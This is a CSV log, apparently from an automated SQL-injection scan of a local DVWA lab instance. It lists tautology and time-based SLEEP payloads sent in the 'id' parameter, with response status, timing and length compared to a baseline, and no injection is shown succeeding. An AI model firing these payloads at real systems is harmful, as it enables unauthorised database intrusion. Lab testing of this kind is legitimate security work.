page_url,param_tested,method,payload,status,elapsed,length,evidence,baseline_length,baseline_elapsed
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,' OR SLEEP(5) --,200,0.003675,1173,,1173,0.004471
http://127.0.0.1/dvwa/js/?C=M;O=A,id,GET,1' OR '1'='1,200,0.005036,1173,,1173,0.004471
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,' OR '1'='1,200,0.005272,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,' OR '1'='1' -- ,200,0.004887,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,' OR 1=1--,200,0.00387,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,""" OR """" = """,200,0.005355,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,' OR SLEEP(5) --,200,0.004629,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/?C=N;O=D,id,GET,1' OR '1'='1,200,0.003537,1173,,1173,0.004567
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,' OR '1'='1,200,0.002602,1030,,1030,0.003631
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,' OR '1'='1' -- ,200,0.003874,1030,,1030,0.003631
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,' OR 1=1--,200,0.003711,1030,,1030,0.003631
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,""" OR """" = """,200,0.003652,1030,,1030,0.003631
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,' OR SLEEP(5) --,200,0.004753,1030,,1030,0.003631
http://127.0.0.1/dvwa/js/dvwaPage.js,id,GET,1' OR '1'='1,200,0.004408,1030,,1030,0.003631
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,' OR '1'='1,200,0.004334,1529,,1529,0.004484
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,' OR '1'='1' -- ,200,0.003959,1529,,1529,0.004484
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,' OR 1=1--,200,0.004218,1529,,1529,0.004484
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,""" OR """" = """,200,0.004891,1529,,1529,0.004484
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,' OR SLEEP(5) --,200,0.005197,1529,,1529,0.004484
http://127.0.0.1/dvwa/css/?C=S;O=A,id,GET,1' OR '1'='1,200,0.004477,1529,,1529,0.004484
